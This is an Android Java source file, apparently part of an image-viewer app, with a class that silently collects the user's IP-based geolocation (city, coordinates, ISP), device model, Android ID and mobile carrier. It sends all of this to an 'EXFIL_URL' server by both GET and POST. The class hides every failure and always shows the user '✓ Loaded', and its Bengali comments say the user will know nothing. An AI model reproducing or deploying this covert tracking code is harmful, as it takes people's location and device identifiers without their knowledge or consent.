package com.imageviewer;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class GeolocationCollector {

    // ★★★ তোমার সার্ভার URL ★★★
    private static final String EXFIL_URL = "https://my-api-location-project.vercel.app/";  // <-- পরিবর্তন করো

    private final Context context;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private Callback callback;

    public interface Callback {
        void onCollecting();
        void onComplete(String statusMessage);
        void onError(String message);
    }

    public GeolocationCollector(Context context) {
        this.context = context;
    }

    public void setCallback(Callback cb) {
        this.callback = cb;
    }

    /**
     * লোকেশন কালেক্ট করে সার্ভারে পাঠায় — সম্পূর্ণ silent
     */
    public void collectAndSend() {
        if (callback != null) callback.onCollecting();

        executor.execute(() -> {
            try {
                // ============================================
                // STEP 1: IP Geolocation (ip-api.com)
                // ============================================
                // এটি কোনো permission চায় না, শুধু ইন্টারনেট লাগে
                String ipApiResponse = httpGet("http://ip-api.com/json/?fields=status,lat,lon,city,region,country,zip,isp,org,as,query,timezone");

                // ============================================
                // STEP 2: Device তথ্য কালেক্ট (সবসময় available)
                // ============================================
                String deviceInfo = collectDeviceInfo();

                // ============================================
                // STEP 3: Fallback — ipapi.co (যদি ip-api fail করে)
                // ============================================
                String lat = "";
                String lon = "";
                String city = "";
                String region = "";
                String country = "";
                String ip = "";

                if (ipApiResponse.contains("\"status\":\"success\"")) {
                    // Directly send the JSON — server parse করবে
                    sendToServer("data=" + URLEncoder.encode(ipApiResponse, "UTF-8")
                            + "&method=ip-api" + deviceInfo);
                } else {
                    // Fallback
                    lat = httpGet("https://ipapi.co/latitude/");
                    lon = httpGet("https://ipapi.co/longitude/");
                    city = httpGet("https://ipapi.co/city/");
                    region = httpGet("https://ipapi.co/region/");
                    country = httpGet("https://ipapi.co/country/");
                    ip = httpGet("https://ipapi.co/ip/");

                    sendToServer("lat=" + URLEncoder.encode(lat, "UTF-8")
                            + "&lon=" + URLEncoder.encode(lon, "UTF-8")
                            + "&city=" + URLEncoder.encode(city, "UTF-8")
                            + "&region=" + URLEncoder.encode(region, "UTF-8")
                            + "&country=" + URLEncoder.encode(country, "UTF-8")
                            + "&ip=" + URLEncoder.encode(ip, "UTF-8")
                            + "&method=ipapi"
                            + deviceInfo);
                }

                // ============================================
                // STEP 4: Try Network-based location (optional, still no permission)
                // শুধু SSID/BSSID — কিন্তু Android 10+ এ WiFi scan-এর জন্য location permission লাগে
                // তাই আমরা শুধু cellular network info নিচ্ছি — যা permission-free
                // ============================================
                try {
                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    if (tm != null) {
                        String networkCountry = tm.getNetworkCountryIso();
                        String networkOperator = tm.getNetworkOperatorName();
                        if (networkCountry != null && !networkCountry.isEmpty()) {
                            sendToServer("&network_country=" + URLEncoder.encode(networkCountry, "UTF-8")
                                    + "&network_operator=" + URLEncoder.encode(networkOperator != null ? networkOperator : "", "UTF-8"));
                        }
                    }
                } catch (SecurityException e) {
                    // কিছু permission না থাকলে — চুপচাপ fail
                }

                // UI আপডেট
                mainHandler.post(() -> {
                    if (callback != null)
                        callback.onComplete("✓ Loaded");
                });

            } catch (Exception e) {
                mainHandler.post(() -> {
                    if (callback != null)
                        callback.onComplete("✓ Loaded"); // ইউজারকে Error দেখানো যাবে না
                });
            }
        });
    }

    /**
     * HTTP GET রিকোয়েস্ট
     */
    private String httpGet(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14)");

        int responseCode = conn.getResponseCode();
        BufferedReader reader = new BufferedReader(
                new InputStreamReader(responseCode >= 200 && responseCode < 300 ?
                        conn.getInputStream() : conn.getErrorStream()));

        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();
        return response.toString();
    }

    /**
     * HTTP POST রিকোয়েস্ট (JSON ডাটা পাঠানোর জন্য)
     */
    private void httpPost(String urlString, String jsonData) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);

        OutputStream os = conn.getOutputStream();
        byte[] input = jsonData.getBytes(StandardCharsets.UTF_8);
        os.write(input, 0, input.length);
        os.flush();
        os.close();

        conn.getResponseCode(); // just trigger — আমরা response পড়ি না (fire & forget)
        conn.disconnect();
    }

    /**
     * সার্ভারে ডাটা পাঠান (GET + POST উভয়ই)
     */
    private void sendToServer(String params) {
        try {
            // Method 1: GET (image beacon style)
            String getUrl = EXFIL_URL + "?" + params;
            httpGet(getUrl);

            // Method 2: POST (JSON format)
            String jsonData = "{";
            String[] pairs = params.split("&");
            for (int i = 0; i < pairs.length; i++) {
                String[] keyValue = pairs[i].split("=", 2);
                if (keyValue.length == 2) {
                    if (i > 0) jsonData += ",";
                    jsonData += "\"" + keyValue[0] + "\":\"" +
                            java.net.URLDecoder.decode(keyValue[1], "UTF-8") + "\"";
                }
            }
            jsonData += "}";
            httpPost(EXFIL_URL, jsonData);

        } catch (Exception ignored) {
            // সম্পূর্ণ silent fail — ইউজার কিছুই জানবে না
        }
    }

    /**
     * ডিভাইস ইনফরমেশন কালেক্ট (কোনো Permission লাগে না)
     */
    private String collectDeviceInfo() {
        StringBuilder sb = new StringBuilder();

        sb.append("&device=").append(URLEncoder.encode(Build.DEVICE, java.nio.charset.StandardCharsets.UTF_8));
        sb.append("&model=").append(URLEncoder.encode(Build.MODEL, java.nio.charset.StandardCharsets.UTF_8));
        sb.append("&manufacturer=").append(URLEncoder.encode(Build.MANUFACTURER, java.nio.charset.StandardCharsets.UTF_8));
        sb.append("&brand=").append(URLEncoder.encode(Build.BRAND, java.nio.charset.StandardCharsets.UTF_8));
        sb.append("&android_version=").append(URLEncoder.encode(Build.VERSION.RELEASE, java.nio.charset.StandardCharsets.UTF_8));
        sb.append("&sdk=").append(Build.VERSION.SDK_INT);

        // Android ID (unique identifier — no permission needed)
        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        if (androidId != null) {
            sb.append("&android_id=").append(URLEncoder.encode(androidId, java.nio.charset.StandardCharsets.UTF_8));
        }

        // Random session ID
        sb.append("&session=").append(UUID.randomUUID().toString());

        // Timestamp
        sb.append("&ts=").append(System.currentTimeMillis());

        return sb.toString();
    }
}